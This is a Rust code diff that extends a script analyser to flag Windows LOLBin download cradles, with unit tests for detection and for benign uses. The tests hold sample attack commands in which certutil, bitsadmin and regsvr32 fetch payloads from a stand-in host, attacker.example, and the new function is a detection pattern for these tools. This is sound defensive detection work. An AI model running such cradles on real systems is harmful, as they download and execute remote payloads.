@@ -605,6 +605,18 @@ fn line_contains_download_command(line: &str) -> bool {
         || SCRIPT_DOTTED_DOWNLOAD_METHODS
             .iter()
             .any(|method| line.contains(method))
+        || line_contains_lolbin_download(line)
+}
+
+/// Windows LOLBin download/remote-exec cradles, each anchored on its
+/// distinctive argument (matching `SCRIPT_LOLBIN_REMOTE_DOWNLOAD`) so a
+/// benign use of the same binary does not register a download. `line` is
+/// already lowercased by the callers.
+fn line_contains_lolbin_download(line: &str) -> bool {
+    (line.contains("certutil") && line.contains("-urlcache"))
+        || (line.contains("bitsadmin") && line.contains("/transfer"))
+        || (line.contains("mshta") && (line.contains("http://") || line.contains("https://")))
+        || (line.contains("regsvr32") && (line.contains("/i:http") || line.contains("scrobj.dll")))
 }
 
 fn line_contains_package_install_command(line: &str) -> bool {
@@ -699,6 +711,37 @@ mod tests {
             !relation_target_present(&script_relations(content), "remote-resource"),
             "a bare identifier must not be read as a download call",
         );
+    }
+
+    /// Contract: Windows LOLBin download cradles raise the Downloads relation
+    /// so they participate in the artifact graph like curl/wget downloads.
+    #[test]
+    fn script_download_detects_windows_lolbins() {
+        for content in [
+            "certutil -urlcache -f http://attacker.example/p.exe p.exe\n",
+            "bitsadmin /transfer job http://attacker.example/p.exe c:\\p.exe\n",
+            "regsvr32 /s /n /u /i:http://attacker.example/x.sct scrobj.dll\n",
+        ] {
+            assert!(
+                relation_target_present(&script_relations(content), "remote-resource"),
+                "LOLBin download must produce a Downloads relation for {content:?}",
+            );
+        }
+    }
+
+    /// Contract (negative): benign uses of the same LOLBins (no download
+    /// argument) must NOT produce a Downloads relation.
+    #[test]
+    fn script_download_rejects_benign_lolbin_uses() {
+        for content in [
+            "certutil -hashfile payload.exe SHA256\n",
+            "regsvr32 /s mylibrary.dll\n",
+        ] {
+            assert!(
+                !relation_target_present(&script_relations(content), "remote-resource"),
+                "benign LOLBin use must not produce a Downloads relation for {content:?}",
+            );
+        }
     }
 
     /// Contract (negative): ordinary words that merely contain an exec-idiom
